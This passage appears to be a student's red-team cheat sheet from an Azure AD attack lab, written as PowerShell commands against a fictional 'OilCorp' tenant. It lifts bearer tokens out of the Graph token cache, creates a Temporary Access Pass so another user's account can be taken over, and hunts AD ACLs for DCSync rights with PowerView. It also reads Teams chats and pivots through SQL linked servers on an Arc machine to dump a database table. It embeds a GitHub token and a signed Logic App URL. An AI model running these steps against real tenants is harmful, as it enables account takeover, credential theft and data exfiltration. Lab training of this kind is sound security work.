        $TokenData = $InMemoryTokenCacheGetTokenData.Invoke([Microsoft.Graph.PowerShell.Authentication.GraphSession]::Instance.InMemoryTokenCache,$null)
        $TokenObjStr = [System.Text.Encoding]::UTF8.GetString($TokenData)
        $obj = $TokenObjStr -Split "`"secret`":`"" 
        $obj = $obj[1] -Split "`",`"credential_type"
        $token = $obj[0]

    # TAP Enum 
        # Check if TAP enabled, we need Policy.Read.All permissions 
            [X509Certificate]$GeologyAppCertificate = Get-PfxCertificate -FilePath C:\AzAD\Tools\spcert.pfx
            Connect-MgGraph -Certificate $GeologyAppCertificate -ClientId b1d10eb3-d631-499f-8197-f13de675904c -TenantId d6bd5a42-7c65-421c-ad23-a25a5d5fa57f
            (Get-MgPolicyAuthenticationMethodPolicy).AuthenticationMethodConfigurations
        # We can create a TAP for explorationsyncuser61 user :
            $properties = @{}
            $properties.isUsableOnce = $True
            $properties.startDateTime = (Get-Date).AddMinutes(60)
            $propertiesJSON = $properties | ConvertTo-Json
            New-MgUserAuthenticationTemporaryAccessPassMethod -UserId explorationsyncuser61@oilcorporation.onmicrosoft.com -BodyParameter $propertiesJSON | fl

    # Logic App Enum
        # Permissions
            $accesstoken = (Get-AzAccessToken).Token
            $URI = "https://management.azure.com/subscriptions/5e4a7f52-ddf6-422b-8aaf-161e342398d6/resourceGroups/AS-oyglsntcfh3343536/providers/Microsoft.Logic/workflows/ASyaivrkblez3343584/providers/Microsoft.Authorization/permissions?api-version=2022-04-01"
            $RequestParams = @{
                Method = 'GET'
                Uri = $URI
                Headers = @{
                'Authorization' = "Bearer $accesstoken"
                }
            }
            $Permissions = (Invoke-RestMethod @RequestParams).value
            $Permissions.actions
        # Getting definition/json code of logic App 
            (Get-AzLogicApp -Name ASyaivrkblez3343584).Definition
        # Getting callback url for logic app 
            Get-AzLogicAppTriggerCallbackUrl -TriggerName manual -Name ASyaivrkblez3343584 -ResourceGroupName AS-oyglsntcfh3343536
        # Executing callbackURL  
            Invoke-RestMethod -Method GET -UseBasicParsing -Uri 'https://prod-54.southeastasia.logic.azure.com:443/workflows/e0dc8e964e5a4556a347d4fceef1417e/triggers/manual/paths/invoke?api-version=2018-07-01-preview&sp=%2Ftriggers%2Fmanual%2Frun&sv=1.0&sig=_YiemEHZwmmdThIlXH_JLX-8-ubyxWEK0DqvV0NRENM'
        
    # Auth to on premise (password should NOT have !)
    # Host file must have records for DC and AD Domain e.g 
        # 172.16.30.1 reservoirone.corp
        # 172.16.30.1 reservoirone-dc.reservoirone.corp
    runas /netonly /user:reservoirone.corp\hybriduser1 cmd
    C:\AzAD\Tools\InviShell\RunWithPathAsAdmin.bat
    . C:\AzAD\Tools\PowerView.ps1
    Get-DomainComputer -DomainController reservoirone-dc.reservoirone.corp -Domain reservoirone.corp
    # Get domain all ACLs, convert sid to name
    Get-DomainObjectAcl -SearchBase "DC=reservoirone,DC=corp" -SearchScope Base -ResolveGUIDs -DomainController reservoirone-dc.reservoirone.corp -Domain reservoirone.corp | ?{($_.ObjectAceType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll')} | ForEach-Object {$_ | Add-Member NoteProperty 'IdentityName' $(Convert-SidToName $_.SecurityIdentifier -DomainController reservoirone-dc.reservoirone.corp -Domain reservoirone.corp);$_}

    # Github 
        # Create an issue
            $url = "https://api.github.com/repos/OilCorp/awsautomation/issues"
            $accessToken = "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"
            $headers = @{
                "Authorization" = "Bearer $accessToken"
                "Content-Type" = "application/json"
            }

            $body = @{
                title = "NewIssueX" 
                body = "NewIssueX"
            } | ConvertTo-Json -Depth 4

            Invoke-RestMethod -Uri $url -Method Post -Headers $headers -Body $body
        # Read comments on certain issue
            $url = "https://api.github.com/repos/OilCorp/awsautomation/issues/39/comments"
            $accessToken = "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"
            $headers = @{
                "Authorization" = "Bearer $accessToken"
                "Content-Type" = "application/json"
            }

            (Invoke-RestMethod -Uri $url -Method Get -Headers $headers).Body
    
    

    # Chat Teams message enum
        # Get All the chats 
            Get-MgChat | fl
        # List the Messages
            Get-MgChatMessage -ChatId 19:183cdc4a-05fc-41a9-a293-969f3b0e727c_2851cfd2-29f6-4700-9505-107d81efc6ae@unq.gbl.spaces | fl
        # List undeleted messages   
            (Get-MgChatMessage -ChatId 19:183cdc4a-05fc-41a9-a293-969f3b0e727c_2851cfd2-29f6-4700-9505-107d81efc6ae@unq.gbl.spaces -ChatMessageId 1684154301636).Body.Content
        # Get certiain user 
            Get-MgUser -All | Where {$_.DisplayName -like "*Carl*"}
    # Arc machine enum
        # Check if there are any registered managed service 
            Get-AzManagedServicesAssignment | fl *
        # Execute commands on Arc machine (requires 10-15 min until output)
            New-AzConnectedMachineRunCommand -MachineName 'ff-machine' -ResourceGroupName 'FFDBMachineRG' -RunCommandName 'SQLQueryX' -Location 'East US' -SourceScript "whoami"
        # Check if Arc machine has SQL server (potential linked SQL server)
            New-AzConnectedMachineRunCommand -MachineName 'ff-machine' -ResourceGroupName 'FFDBMachineRG' -RunCommandName 'SQLQueryX' -Location 'East US' -SourceScript "net start | Select-String 'SQL'"
        # Check if there are any Linked servers to the SQL Server: 
            New-AzConnectedMachineRunCommand -MachineName 'ff-machine' -ResourceGroupName 'FFDBMachineRG' -RunCommandName 'SQLQueryX' -Location 'East US' -SourceScript "sqlcmd -s FF-MACHINE -Q `"EXECUTE ('Select name from sys.servers')`""
        # Check if the EDI linked server has any linked server 
            New-AzConnectedMachineRunCommand -MachineName 'ff-machine' -ResourceGroupName 'FFDBMachineRG' -RunCommandName 'SQLQueryX' -Location 'East US' -SourceScript "sqlcmd -s FF-MACHINE -Q `"EXECUTE ('Select name from sys.servers') AT [EDI]`""
        # Reterive databases from the AZURESQL linked server command 
            $ServerName = 'AZURESQL'
            New-AzConnectedMachineRunCommand -MachineName 'ff-machine' -ResourceGroupName 'FFDBMachineRG' -RunCommandName 'SQLQueryX' -Location 'East US' -SourceScript "sqlcmd -s FF-MACHINE -Q `"EXECUTE ('sp_catalogs $ServerName') AT [EDI]`""
        # let us try retrieving the tables from   'oilcorp_logistics_database' database
            $ServerName = 'AZURESQL'
            $DBName = 'oilcorp_logistics_database'
            New-AzConnectedMachineRunCommand -MachineName 'ff-machine' -ResourceGroupName 'FFDBMachineRG' -RunCommandName 'SQLQueryX' -Location 'East US' -SourceScript "sqlcmd -s FF-MACHINE -Q `"EXECUTE ('sp_tables_ex @table_server = $ServerName, @table_catalog = $DBName') AT [EDI]`"" 
        # View certain "inventory" table content from oilcorp_logistics_database DB:
            New-AzConnectedMachineRunCommand -MachineName 'ff-machine' -ResourceGroupName 'FFDBMachineRG' -RunCommandName 'SQLQueryX' -Location 'East US' -SourceScript "sqlcmd -s FF-MACHINE -Q `"EXECUTE ('SELECT * FROM [AZURESQL].[oilcorp_logistics_database].[dbo].[inventory]') AT [EDI]`""
        # Get Cert thumbprint
            Get-PfxCertificate -FilePath C:\Users\studentuserX\Downloads\Miro_Certificate.pfx
        
        
